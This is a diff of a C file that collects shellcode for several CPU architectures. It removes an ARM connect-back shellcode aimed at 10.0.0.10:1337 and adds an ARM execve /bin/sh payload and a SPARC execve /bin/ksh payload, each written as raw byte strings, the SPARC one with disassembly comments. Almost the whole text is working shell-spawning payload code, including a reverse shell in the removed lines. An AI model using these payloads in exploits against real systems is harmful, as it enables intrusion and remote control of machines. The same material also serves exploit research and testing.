@@ -2,12 +2,13 @@
 #include <stdio.h>
 #include <string.h>
  
-    char lar[] =    "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x92\x1a\x90\x1a\x17\x27\x01\xdf"
-             "\x02\x20\x41\x1e\x82\x1e\x07\x02\xe7\x3f\x01\xdf\x05\x1c\x01\xac"
-             "\x02\x21\x21\x60\x02\x34\x05\x21\x21\x70\x01\x34\x39\x21\x21\x70"
-             "\x0a\x21\x02\x91\x04\x34\x21\x70\x01\xa9\x10\x22\x02\x37\x01\xdf"
-             "\xdc\x3f\x02\x21\x28\x1c\x01\xdf\x01\x39\xfb\xd5\x49\x1a\x92\x1a"
-             "\x0b\x27\x01\xa0\x01\xdf\xc0\x46\x2f\x62\x69\x6e\x2f\x73\x68"; /* 10.0.0.10:1337 */
+char lae[] = "\x01\x30\x8f\xe2"
+            "\x13\xff\x2f\xe1"
+            "\x78\x46\x08\x30"
+            "\x49\x1a\x92\x1a"
+            "\x0b\x27\x01\xdf"
+            "\x2f\x62\x69\x6e"
+            "\x2f\x73\x68";
              
 /* execve-core.c by Charles Stevenson <core@bokeoa.com> */
 char lpe[] = /* execve /bin/sh linux/ppc by core */
@@ -330,7 +331,21 @@ char lsp[]=
   "\x82\x10\x20\x3b"    //  mov  0x3b, %g1
   "\x91\xd0\x20\x10";   //  ta  0x10
   
-char *code[]={lar, lpe, lpr, lmel, lme, lmp, lsr, lsp };
+char lse[]=
+    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
+    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
+    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
+    "\x90\x03\xe0\x20"     /* add     %o7,32,%o0           */
+    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
+    "\xc0\x22\x20\x08"     /* st      %g0,[%o0+8]          */
+    "\xd0\x22\x20\x10"     /* st      %o0,[%o0+16]         */
+    "\xc0\x22\x20\x14"     /* st      %g0,[%o0+20]         */
+    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
+    "\x91\xd0\x20\x08"     /* ta      8                    */
+    "/bin/ksh"
+;
+  
+char *code[]={lae, lpe, lpr, lmel, lme, lmp, lsr, lsp, lse };
   
 int main(void)
 {
